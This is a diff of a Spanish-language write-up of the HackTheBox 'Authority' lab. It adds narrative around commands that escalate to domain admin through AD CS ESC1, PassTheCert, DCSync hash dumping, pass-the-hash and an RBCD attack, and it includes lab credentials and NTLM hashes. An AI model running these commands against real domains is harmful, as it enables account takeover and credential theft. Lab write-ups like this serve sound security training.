@@ -667,7 +667,19 @@ Desde el Domain Controller, importaremos en memoria el `adPEAS` y lo invocaremos
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS
 ```
 
-En el resultado obtenido, nos encontramos que ha encontrado una escalada de privilegios relacionada con los `Active Directory Certificate Services` (ADCS).
+En la enumeración con **adPEAS**, identificamos que la máquina tiene **Active Directory Certificate Services (AD CS)** habilitado, específicamente con la CA **AUTHORITY-CA**, que está corriendo en `authority.authority.htb` (IP `10.10.11.222`).
+
+Al revisar los **templates disponibles**, encontramos varios, entre ellos:
+
+* **CorpVPN**
+* **AuthorityLDAPS**
+* **DomainControllerAuthentication**
+* **KerberosAuthentication**
+* **User**
+* **Administrator**
+* Y otros más...
+
+Lo interesante es que el template **CorpVPN** tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que indica que permite definir el Subject cuando se solicita un certificado. Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.
 
 ```powershell
 [?] +++++ Searching for Active Directory Certificate Services Information +++++
@@ -712,9 +724,9 @@ EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_
 
 ### Abusing Active Directory Certificate Services (ADCS)
 
+Confirmamos la existencia de **ESC1 (Enrollment Services Configuration #1)** en el servicio **Active Directory Certificate Services (AD CS)** de la CA `AUTHORITY-CA`.
 
-
-
+Usando **Certipy**, identificamos que el template `CorpVPN` tiene configurado el flag `ENROLLEE_SUPPLIES_SUBJECT` y permite autenticación de cliente (`Client Authentication`). Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.
 
 ```bash
 ❯ certipy-ad find -u 'svc_ldap'@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout
@@ -801,11 +813,11 @@ Certificate Templates
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
-
-
 ### ESC1 exploitation case (Machine Account) with certipy-ad
 
+Intentamos explotar **ESC1**, pero el usuario `svc_ldap` no tiene permisos de inscripción (`enrollment`) en el template `CorpVPN`. Solo las cuentas dentro del grupo **HTB\Domain Computers** pueden inscribirse y solicitar certificados con este template.
 
+Si podemos comprometer un equipo con una cuenta de máquina (`AUTHORITY.HTB\PC$`), podríamos usarla para inscribir un certificado y luego abusar de él.
 
 ```bash
 ❯ certipy-ad req -u 'svc_ldap'@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222
@@ -817,9 +829,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 Would you like to save the private key? (y/N) 
 ```
 
-
-
-adPEAS
+Confirmamos con **adPEAS** que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que permite al solicitante definir el Subject Alternative Name (SAN). Sin embargo, también verificamos que **solo las cuentas dentro del grupo `HTB\Domain Computers` tienen permisos de inscripción (`enrollment`)**.
 
 ```powershell
 [?] +++++ Checking Template 'CorpVPN' +++++
@@ -827,7 +837,9 @@ adPEAS
 [+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
 ```
 
+En el resultado de **adPEAS**, observamos que el **MachineAccountQuota** está configurado en **10**, lo que significa que cualquier usuario autenticado puede agregar hasta 10 equipos al dominio.
 
+Dado que previamente identificamos que **solo los Domain Computers tienen permisos de enrollment** en el template vulnerable, podemos aprovechar esta configuración para **crear una cuenta de máquina controlada por nosotros** y así explotar **ESC1**.
 
 ```powershell
 [?] +++++ Checking Add-Computer Permissions +++++
@@ -842,11 +854,11 @@ memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=ht
 					CN=Users,CN=Builtin,DC=authority,DC=htb
 ```
 
+A continuación, realizaremos el `ESC1` enfocado a las `Machine Account` que son las que disponen de permisos de `enrollment` para realizar la explotación.
 
+Para ello, el objetivo será crear un nuevo `Computer` para poder realizar el `ESC1` con las credenciales de la cuenta de equipo del PC que creemos. A través de la herramienta de `PowerView.py` nos conectaremos mediante LDAP y crearemos un nuevo `Computer` llamado `Gzzcoo` con credenciales `Gzzcoo123`.
 
 {% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc1#esc1-linux-machine-account" %}
-
-
 
 ```bash
 ❯ powerview authority.htb/'svc_ldap':'lDaP_1n_th3_cle4r!'@10.10.11.222 --dc-ip 10.10.11.222
@@ -861,7 +873,7 @@ PV > Add-ADComputer -ComputerName Gzzcoo -ComputerPass Gzzcoo123
 [2025-02-22 05:13:49] Successfully added machine account Gzzcoo$ with password Gzzcoo123.
 ```
 
-
+Una vez tengamos el `Computer` creado, verificaremos desde `PowerView.py` de que el objeto se ha creado correctamente en el Active Directory.
 
 ```powershell
 PV > Add-ADComGet-ADObject -Identity Gzzcoo$
@@ -903,10 +915,9 @@ objectCategory             : CN=Computer,CN=Schema,CN=Configuration,DC=authority
 isCriticalSystemObject     : False
 dSCorePropagationData      : 01/01/1601
 mS-DS-CreatorSID           : S-1-5-21-622327497-3269355298-2248959698-1601
-
 ```
 
-
+Una vez que hemos creado una cuenta de equipo, procedemos a realizar el `ESC1` utilizando sus credenciales. La solicitud de certificado se completa con éxito, obteniendo un certificado con el UPN `administrator@authority.htb`, lo que nos permite autenticarnos como este usuario y escalar privilegios en el dominio.
 
 ```bash
 ❯ certipy-ad req -u 'Gzzcooo$'@10.10.11.222 -p 'Gzzcoo123' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -target 10.10.11.222
@@ -920,7 +931,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-
+Al intentar autenticarnos con el certificado **PFX**, obtenemos un error **KDC\_ERR\_PADATA\_TYPE\_NOSUPP**, lo que indica que el KDC no admite el tipo de autenticación proporcionado. Más adelante, exploraremos otras formas de autenticarnos con este certificado para intentar acceder con éxito al dominio.
 
 ```bash
 ❯ certipy-ad auth -pfx administrator.pfx -username Administrator -domain authority.htb
@@ -933,13 +944,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 ### Authenticating with certificates when PKINIT is not supported (PassTheCert.py)
 
+Nos encontramos con varios blogs que mencionan el error **KDC\_ERR\_PADATA\_TYPE\_NOSUPP**, el cual ocurre cuando el **controlador de dominio no soporta PKINIT**. Esto impide que autenticarnos directamente con el certificado PFX.
 
+Como alternativa, podemos utilizar **PassTheCert** para autenticarnos a **LDAP a través de SChannel** con nuestro certificado. Aunque esto solo nos daría acceso a LDAP, podría ser suficiente si el certificado nos identifica como **Administrador de Dominio**.
 
 {% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}
 
 {% embed url="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d" %}
-
-
 
 {% hint style="info" %}
 KDC\_ERR\_PADATA\_TYPE\_NOSUPP
@@ -951,13 +962,9 @@ Also, according to Microsoft, “This problem can happen because the wrong certi
 If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.
 {% endhint %}
 
-
-
-
+Lo primero que haremos será extraer la **clave privada** y el **certificado** desde el archivo PFX que obtuvimos del usuario **Administrator**. Para ello, utilizamos **Certipy** de la siguiente manera. A continuación, haremos uso de la herramienta `PassTheCert.py` para autentifcarnos con el certificado obtenido.
 
 {% embed url="https://github.com/AlmondOffSec/PassTheCert" %}
-
-
 
 ```bash
 ❯ certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
@@ -971,7 +978,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Writing private key to 'administrator.key'
 ```
 
-
+Con **PassTheCert**, utilizamos la clave privada y el certificado generado anteriormente para autenticarnos. El resultado confirma que estamos autenticados como **HTB\Administrator**, lo que significa que podemos conectarnos vía **LDAP SChannel** y realizar otras acciones para intentar **escalar privilegios** y obtener acceso completo al sistema.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action whoami -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
@@ -980,11 +987,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] You are logged in as: HTB\Administrator
 ```
 
-
-
 ### Nº1 PrivEsc - Adding user to Domain Admins group trough PassTheCert Authentication
 
+El primer método que probamos fue utilizar **PassTheCert** para conectarnos a una **shell de LDAP** que ofrece la herramienta. Desde ahí, usamos el comando **add\_user\_to\_group** para añadir el usuario no privilegiado que teníamos previamente al grupo **Domain Admins**.
 
+El resultado confirma que el usuario **svc\_ldap** fue agregado con éxito al grupo **Domain Admins**, lo que nos otorga privilegios elevados en el dominio.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
@@ -1020,7 +1027,9 @@ Type help for list of commands
 Adding user: svc_ldap to group Domain Admins result: OK
 ```
 
+Conectados al **DC** con el usuario **svc\_ldap** a través de **WinRM** (ya que verificamos previamente que tenía permisos para hacerlo), revisamos los miembros del grupo **Domain Admins** y confirmamos que ahora formamos parte de él.
 
+Aunque ya tenemos privilegios de **Domain Admin**, nuestro objetivo final es **convertirnos en el usuario Administrator**. Para ello, exploraremos otros ataques que nos permitan obtener acceso directo a esta cuenta.
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> net group "Domain Admins"
@@ -1034,7 +1043,9 @@ Administrator            svc_ldap
 The command completed successfully.
 ```
 
+Como ahora formamos parte de **Domain Admins**, tenemos permisos para realizar un ataque **DCSync**, lo que nos permite extraer los hashes de las credenciales del dominio mediante **secretsdump.py**.
 
+Aquí obtenemos el **NT hash** del usuario **Administrator**, lo que nos permitirá realizar un **Pass-The-Hash** y acceder directamente con su cuenta.
 
 ```bash
 ❯ secretsdump.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 -dc-ip 10.10.11.222 -just-dc-ntlm
@@ -1050,7 +1061,7 @@ AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:addf932778c269fb8c1a60e72256925
 [*] Cleaning up... 
 ```
 
-
+Verificamos que el NT hash obtenido es válido realizando un Pass-The-Hash (PTH) con **nxc**, lo que nos confirma que la autenticación con el hash NTLM del usuario **Administrator** es correcta. Luego, utilizamos **Evil-WinRM** para acceder al **DC** con privilegios de administrador y, finalmente, verificamos el contenido de la flag **root.txt**.
 
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed'
@@ -1066,12 +1077,14 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
-ecfaaf85b2859960b8313f78b73cd39e
+ecfaa***************************
 ```
 
 ### Nº2 PrivEsc - Assigning DCSync permissions to a user through PassTheCert Authentication
 
-otra
+Otro método que encontramos es asignar permisos de **DCSync** a un usuario sin necesidad de añadirlo directamente al grupo **Domain Admins**, lo cual puede ser una acción más evidente. Utilizamos **PassTheCert** para otorgar estos permisos al usuario **svc\_ldap**, lo que nos permite realizar un **secretsdump** posteriormente para extraer hashes de contraseñas sin necesidad de ser parte del grupo de administradores.
+
+Con este método, le otorgamos al usuario **svc\_ldap** permisos para realizar un **DCSync** sin necesidad de comprometer directamente a **Domain Admins**, lo que lo hace menos detectable. Esto nos permitirá extraer hashes de contraseñas y realizar otras acciones de escalada de privilegios.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
@@ -1080,7 +1093,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Granted user 'svc_ldap' DCSYNC rights!
 ```
 
+En este caso, usamos **nxc** para realizar el dump del archivo **NTDS.dit** desde el controlador de dominio. Este es otro método que aprovechamos para obtener los hashes de contraseñas del dominio. En este proceso, conseguimos hacer el dump de los hashes NTDS del controlador de dominio. Entre los resultados obtenidos, encontramos varios hashes relevantes, como los de los usuarios **Administrator**, **Guest**, **krbtgt**, y **svc\_ldap**.&#x20;
 
+Con esto, podríamos emplear la técnica de `PassTheHash` para autenticarnos como el usuario `Administrator` con su hash NTLM.
 
 ```bash
 ❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ntds
@@ -1102,6 +1117,10 @@ SMB         10.10.11.222    445    AUTHORITY        [*] grep -iv disabled /home/
 
 ### Nº3 PrivEsc - Resource-based Constrained Delegation (RBCD Attack) trough PassTheCert Authentication
 
+En este caso, implementamos un ataque **RBCD (Resource-based Constrained Delegation)** para escalar privilegios. A través de **PassTheCert**, comenzamos creando un nuevo equipo dentro del dominio, lo que nos permite posteriormente aprovechar las delegaciones restringidas de recursos. Para esto, usamos el siguiente comando para añadir un equipo al dominio y asignarle una contraseña:
+
+Este comando añadió con éxito una cuenta de máquina llamada **rbcd\_gzzcoo$** al dominio **authority.htb**, lo cual es el primer paso en la explotación de la delegación de recursos. El siguiente paso sería configurar la delegación para que esta máquina pueda ser utilizada en el ataque RBCD, lo que nos permitiría acceder a los recursos del dominio o a los servicios delegados con mayores privilegios.
+
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action add_computer -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -computer-name 'rbcd_gzzcoo$' -computer-pass 'Gzzcoo123'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1109,7 +1128,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account rbcd_gzzcoo$ with password Gzzcoo123.
 ```
 
+El siguiente paso en la explotación de **Resource-based Constrained Delegation (RBCD)** consiste en configurar correctamente los permisos de delegación para que la máquina **rbcd\_gzzcoo$** pueda actuar en nombre de los usuarios de la máquina **AUTHORITY$**.
 
+Con este comando, hemos configurado **rbcd\_gzzcoo$** para que pueda actuar en nombre de los usuarios en **AUTHORITY$** mediante el protocolo **S4U2Proxy**. Esto significa que ahora la máquina **rbcd\_gzzcoo$** tiene permisos para suplantar identidades de los usuarios de **AUTHORITY$**, lo que nos proporciona un vector para escalar privilegios aún más.
+
+Al permitir que **rbcd\_gzzcoo$** actúe en nombre de **AUTHORITY$**, tenemos acceso a las credenciales y recursos protegidos por las políticas de delegación en la máquina **AUTHORITY$**. Esto abre la puerta a la obtención de privilegios elevados y al acceso a más recursos dentro del dominio.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action write_rbcd -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -delegate-to 'AUTHORITY$' -delegate-from 'rbcd_gzzcoo$'
@@ -1122,10 +1145,15 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*]     rbcd_gzzcoo$   (S-1-5-21-622327497-3269355298-2248959698-11604)
 ```
 
+Después de configurar la delegación RBCD correctamente, utilizamos **impacket-getST** para obtener el Ticket Granting Ticket (TGT) del usuario **Administrator** y luego lo usamos para suplantarlo. Ejecutamos el siguiente comando para obtener el ticket y realizar la suplantación mediante **S4U2Proxy.**
 
+Este proceso genera el ticket Kerberos necesario y lo guarda en el archivo **Administrator@cifs\_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache**. A continuación, usamos el ticket para ejecutar un comando **wmiexec.py** y obtener acceso remoto a la máquina **AUTHORITY.**
 
-```bash
-❯ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator -dc-ip 10.10.11.222 'authority.htb'/'rbcd_gzzcoo$':'Gzzcoo123' 2>/dev/null
+Esto nos otorga acceso con privilegios de **htb\administrator**. Al ejecutar **whoami**, verificamos que hemos conseguido los permisos de **Administrator**. También usamos el comando **ipconfig** para obtener detalles de la red, confirmando que la máquina **AUTHORITY** tiene la IP **10.10.11.222**.
+
+Con esto, logramos una escalada de privilegios exitosa utilizando **RBCD** a través de **PassTheCert** y Kerberos.
+
+<pre class="language-bash"><code class="lang-bash">❯ impacket-getS<a data-footnote-ref href="#user-content-fn-1">T</a> -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator -dc-ip 10.10.11.222 'authority.htb'/'rbcd_gzzcoo$':'Gzzcoo123' 2>/dev/null
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
@@ -1159,4 +1187,6 @@ Ethernet adapter Ethernet0:
    Subnet Mask . . . . . . . . . . . : 255.255.254.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6791%8
                                        10.10.10.2
-```
+</code></pre>
+
+[^1]: 
